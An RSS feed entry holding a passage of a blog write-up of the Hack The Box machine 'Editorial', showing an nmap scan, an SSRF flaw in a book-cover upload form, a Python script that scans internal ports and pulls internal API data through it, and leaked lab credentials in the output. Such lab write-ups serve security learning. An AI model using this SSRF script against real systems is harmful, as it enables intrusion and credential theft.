<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss"><channel><title>Linux on Shakil's Blog</title><link>https://hshakilst.github.io/tags/linux/</link><description>Recent content in Linux on Shakil's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Shakil Hossain - All Right Reserved.</copyright><lastBuildDate>Sun, 16 Jun 2024 05:12:20 -0400</lastBuildDate><atom:link href="https://hshakilst.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml"/><icon>https://hshakilst.github.io/logo.svg</icon><item><title>HTB Machine Editorial</title><link>https://hshakilst.github.io/posts/htb-machines/editorial/</link><pubDate>Sun, 16 Jun 2024 05:12:20 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-machines/editorial/</guid><description><![CDATA[<h1 id="editorial---htbhttpsapphacktheboxcommachineseditorial">Editorial - <a href="https://app.hackthebox.com/machines/Editorial">HTB</a></h1>
<p><img src="images/banner.png" alt="alt text"></p>
<h3 id="recon">Recon</h3>
<p>Let&rsquo;s start off by Nmap&rsquo;ing the target.</p>
<h4 id="nmap">Nmap</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span># Nmap 7.94SVN scan initiated Tue Jun 18 07:58:25 2024 as: nmap -vvv -p 22,80 -sCV -oN nmap 10.129.49.40
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report for editorial.htb (10.129.49.40)
</span></span><span style="display:flex;"><span>Host is up, received conn-refused (0.37s latency).
</span></span><span style="display:flex;"><span>Scanned at 2024-06-18 07:58:25 +02 for 27s
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT STATE SERVICE REASON VERSION
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>| 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
</span></span><span style="display:flex;"><span>| 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>80/tcp open http syn-ack nginx 1.18.0 (Ubuntu)
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span><span style="display:flex;"><span>|_http-title: Editorial Tiempo Arriba
</span></span><span style="display:flex;"><span>| http-methods:
</span></span><span style="display:flex;"><span>|_ Supported Methods: OPTIONS HEAD GET
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span># Nmap done at Tue Jun 18 07:58:52 2024 -- 1 IP address (1 host up) scanned in 27.03 seconds
</span></span></code></pre></div><h4 id="http-service">HTTP Service</h4>
<p><img src="images/20240618081128.png" alt="alt text">
The <code>http://editorial.htb/upload</code> looks interesting. There&rsquo;s a field name called <code>bookurl</code> which accepts an URL and tries to load the image when the <code>Preview</code> button is clicked. It sends the following request.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>POST /upload-cover HTTP/1.1
</span></span><span style="display:flex;"><span>Host: editorial.htb
</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
</span></span><span style="display:flex;"><span>Accept: */*
</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q=0.5
</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
</span></span><span style="display:flex;"><span>Content-Type: multipart/form-data; boundary=---------------------------30720708513481866454123983682
</span></span><span style="display:flex;"><span>Content-Length: 372
</span></span><span style="display:flex;"><span>Origin: http://editorial.htb
</span></span><span style="display:flex;"><span>Connection: close
</span></span><span style="display:flex;"><span>Referer: http://editorial.hrb/upload
</span></span><span style="display:flex;"><span>DNT: 1
</span></span><span style="display:flex;"><span>Sec-GPC: 1 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----------------------------30720708513481866454123983682
</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;bookurl&#34;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>http://10.10.14.133:8000/aaa.jpeg
</span></span><span style="display:flex;"><span>-----------------------------30720708513481866454123983682
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;bookfile&#34;; filename=&#34;&#34;
</span></span><span style="display:flex;"><span>Content-Type: application/octet-stream
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----------------------------30720708513481866454123983682--
</span></span></code></pre></div><p>The above request sends a GET request to <code>http://10.10.14.133:8000/aaa.jpeg</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 -m http.server
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#bd93f9">8000</span> <span style="color:#ff79c6">(</span>http://0.0.0.0:8000/<span style="color:#ff79c6">)</span> ...
</span></span><span style="display:flex;"><span>10.129.49.40 - - <span style="color:#ff79c6">[</span>18/Jun/2024 08:07:01<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /aaa.jpeg HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> -
</span></span></code></pre></div><p>Looks like it&rsquo;s vulnerable to SSRF and we can read the data by visiting a temporary upload URL.
<img src="images/20240618081046.png" alt="alt text"></p>
<p>After this point, I tried to upload a shell but I couldn&rsquo;t execute code on the server. Also the temporary file was deleted between 1-2 minutes. So, I researched on SSRF and found an <a href="https://cyberweapons.medium.com/internal-port-scanning-via-ssrf-eb248ae6fa7b">article discussing internal port scanning using SSRF called <strong>Cross-Site Port Attack</strong>(XSPA)</a>.</p>
<p>Then, I tried Burp&rsquo;s intruder but the scan time was very slow in the community edition. Therefore, I wrote a custom python script to scan for ports and using the temporary file upload link we can grab the information about any possible hits.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">discoverPorts</span>(port):
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># URL to which the request will be sent</span>
</span></span><span style="display:flex;"><span>    url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://editorial.htb/upload-cover&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Files to be uploaded</span>
</span></span><span style="display:flex;"><span>    files <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;bookfile&#39;</span>: (<span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#f1fa8c">&#39;application/octet-stream&#39;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Form data</span>
</span></span><span style="display:flex;"><span>    data <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;bookurl&#39;</span>: <span style="color:#f1fa8c">&#39;http://127.0.0.1:&#39;</span> <span style="color:#ff79c6">+</span> port
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Headers for the request</span>
</span></span><span style="display:flex;"><span>    headers <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Host&#39;</span>: <span style="color:#f1fa8c">&#39;editorial.htb&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;User-Agent&#39;</span>: <span style="color:#f1fa8c">&#39;Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept&#39;</span>: <span style="color:#f1fa8c">&#39;*/*&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept-Language&#39;</span>: <span style="color:#f1fa8c">&#39;en-US,en;q=0.5&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept-Encoding&#39;</span>: <span style="color:#f1fa8c">&#39;gzip, deflate, br&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Origin&#39;</span>: <span style="color:#f1fa8c">&#39;http://editorial.htb&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Connection&#39;</span>: <span style="color:#f1fa8c">&#39;close&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Referer&#39;</span>: <span style="color:#f1fa8c">&#39;http://editorial.htb/upload&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;DNT&#39;</span>: <span style="color:#f1fa8c">&#39;1&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Sec-GPC&#39;</span>: <span style="color:#f1fa8c">&#39;1&#39;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Send the POST request with the files, form data, and headers</span>
</span></span><span style="display:flex;"><span>    response <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url, files<span style="color:#ff79c6">=</span>files, data<span style="color:#ff79c6">=</span>data, headers<span style="color:#ff79c6">=</span>headers)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Print the response from the server</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>text <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#39;/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Found Something Interesting on Port: &#34;</span> <span style="color:#ff79c6">+</span> port)
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(response<span style="color:#ff79c6">.</span>text)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>text<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#34;static/uploads/&#34;</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Getting the Interesting File&#34;</span>)
</span></span><span style="display:flex;"><span>            url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://editorial.htb/&#39;</span> <span style="color:#ff79c6">+</span> response<span style="color:#ff79c6">.</span>text
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(url)
</span></span><span style="display:flex;"><span>            res_secret <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> res_secret<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#39;intresting-file.txt&#39;</span>,<span style="color:#f1fa8c">&#39;wb&#39;</span>) <span style="color:#ff79c6">as</span> file:
</span></span><span style="display:flex;"><span>                    file<span style="color:#ff79c6">.</span>write(res_secret<span style="color:#ff79c6">.</span>text<span style="color:#ff79c6">.</span>encode())
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Nothing found on Port: &#34;</span> <span style="color:#ff79c6">+</span> port)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">getEndpointData</span>(endpoint):
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># URL to which the request will be sent</span>
</span></span><span style="display:flex;"><span>    url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://editorial.htb/upload-cover&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Files to be uploaded</span>
</span></span><span style="display:flex;"><span>    files <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;bookfile&#39;</span>: (<span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#f1fa8c">&#39;application/octet-stream&#39;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Form data</span>
</span></span><span style="display:flex;"><span>    data <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;bookurl&#39;</span>: <span style="color:#f1fa8c">&#39;http://127.0.0.1:5000&#39;</span> <span style="color:#ff79c6">+</span> endpoint
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Headers for the request</span>
</span></span><span style="display:flex;"><span>    headers <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Host&#39;</span>: <span style="color:#f1fa8c">&#39;editorial.htb&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;User-Agent&#39;</span>: <span style="color:#f1fa8c">&#39;Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept&#39;</span>: <span style="color:#f1fa8c">&#39;*/*&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept-Language&#39;</span>: <span style="color:#f1fa8c">&#39;en-US,en;q=0.5&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept-Encoding&#39;</span>: <span style="color:#f1fa8c">&#39;gzip, deflate, br&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Origin&#39;</span>: <span style="color:#f1fa8c">&#39;http://editorial.htb&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Connection&#39;</span>: <span style="color:#f1fa8c">&#39;close&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Referer&#39;</span>: <span style="color:#f1fa8c">&#39;http://editorial.htb/upload&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;DNT&#39;</span>: <span style="color:#f1fa8c">&#39;1&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Sec-GPC&#39;</span>: <span style="color:#f1fa8c">&#39;1&#39;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Send the POST request with the files, form data, and headers</span>
</span></span><span style="display:flex;"><span>    response <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url, files<span style="color:#ff79c6">=</span>files, data<span style="color:#ff79c6">=</span>data, headers<span style="color:#ff79c6">=</span>headers)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Print the response from the server</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>text <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#39;/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Found Something Interesting on endpoint: &#34;</span> <span style="color:#ff79c6">+</span> endpoint)
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(response<span style="color:#ff79c6">.</span>text)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>text<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#34;static/uploads/&#34;</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Getting the Interesting File&#34;</span>)
</span></span><span style="display:flex;"><span>            url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://editorial.htb/&#39;</span> <span style="color:#ff79c6">+</span> response<span style="color:#ff79c6">.</span>text
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(url)
</span></span><span style="display:flex;"><span>            res_secret <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> res_secret<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>                filename <span style="color:#ff79c6">=</span> endpoint<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span>                filename <span style="color:#ff79c6">=</span> filename[<span style="color:#8be9fd;font-style:italic">len</span>(filename)<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(filename,<span style="color:#f1fa8c">&#39;wb&#39;</span>) <span style="color:#ff79c6">as</span> file:
</span></span><span style="display:flex;"><span>                    file<span style="color:#ff79c6">.</span>write(res_secret<span style="color:#ff79c6">.</span>text<span style="color:#ff79c6">.</span>encode())
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Nothing found on URL: &#34;</span> <span style="color:#ff79c6">+</span> url)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">3000</span>, <span style="color:#bd93f9">10000</span>):
</span></span><span style="display:flex;"><span>        stop_flag <span style="color:#ff79c6">=</span> discoverPorts(<span style="color:#8be9fd;font-style:italic">str</span>(i))
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> stop_flag:
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">break</span>
</span></span><span style="display:flex;"><span>    endpoints <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/promos&#34;</span>,
</span></span><span style="display:flex;"><span>                 <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/coupons&#34;</span>,
</span></span><span style="display:flex;"><span>                 <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/authors&#34;</span>,
</span></span><span style="display:flex;"><span>                 <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/how_to_use_platform&#34;</span>,
</span></span><span style="display:flex;"><span>                 <span style="color:#f1fa8c">&#34;/api/latest/metadata/changelog&#34;</span>,
</span></span><span style="display:flex;"><span>                 <span style="color:#f1fa8c">&#34;/api/latest/metadata&#34;</span>]
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> endpoint <span style="color:#ff79c6">in</span> endpoints:
</span></span><span style="display:flex;"><span>        getEndpointData(endpoint)
</span></span><span style="display:flex;"><span>    
</span></span></code></pre></div><p>The script is a proof of concept and not refactored well but it gets the job done.</p>
<p>I found a hit on port <code>5000</code> and the output looks like the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;messages&#34;</span>: [
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;promotions&#34;</span>: {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve a list of all the promotions in our library.&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/promos&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;coupons&#34;</span>: {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve the list of coupons to use in our library.&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/coupons&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;new_authors&#34;</span>: {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve the welcome message sended to our new authors.&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/authors&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;platform_use&#34;</span>: {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve examples of how to use the platform.&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/how_to_use_platform&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    ],
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;version&#34;</span>: [
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;changelog&#34;</span>: {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve a list of all the versions and updates of the api.&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata/changelog&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;latest&#34;</span>: {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve the last version of api.&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It seems there&rsquo;s an internal API service running on port 5000. So I tried to get all the endpoints listed here. Out of these 6 endpoints 3 of them returned 200 and JSON data.</p>
<p><strong>authors</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;template_mail_message&#34;</span>: <span style="color:#f1fa8c">&#34;Welcome to the team! We are thrilled to have you on board and can&#39;t wait to see the incredible content you&#39;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#39;t hesitate to reach out if you have any questions or ideas - we&#39;re always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team.&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong>changelog</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;1&#34;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;api_route&#34;</span>: <span style="color:#f1fa8c">&#34;/api/v1/metadata/&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_1&#34;</span>: <span style="color:#f1fa8c">&#34;soporte@tiempoarriba.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_2&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.oc&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;editorial&#34;</span>: <span style="color:#f1fa8c">&#34;Editorial El Tiempo Por Arriba&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;1.1&#34;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;api_route&#34;</span>: <span style="color:#f1fa8c">&#34;/api/v1.1/metadata/&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_1&#34;</span>: <span style="color:#f1fa8c">&#34;soporte@tiempoarriba.oc&#34;</span>,
